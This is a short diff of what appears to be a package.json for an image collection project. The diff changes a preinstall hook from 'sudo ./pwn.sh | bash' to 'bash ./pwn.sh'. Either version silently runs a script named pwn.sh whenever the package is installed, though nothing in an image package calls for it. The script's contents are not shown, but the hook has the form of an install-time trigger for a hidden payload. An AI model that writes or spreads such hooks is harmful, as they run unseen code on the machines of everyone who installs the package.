@@ -4,7 +4,7 @@
   "description": "Images that are belles",
   "homepage": "https://github.com/Yosiroute/belle_image",
   "scripts": {
-    "preinstall": "sudo ./pwn.sh | bash"
+    "preinstall": "bash ./pwn.sh"
   },
   "dependencies": {
   },
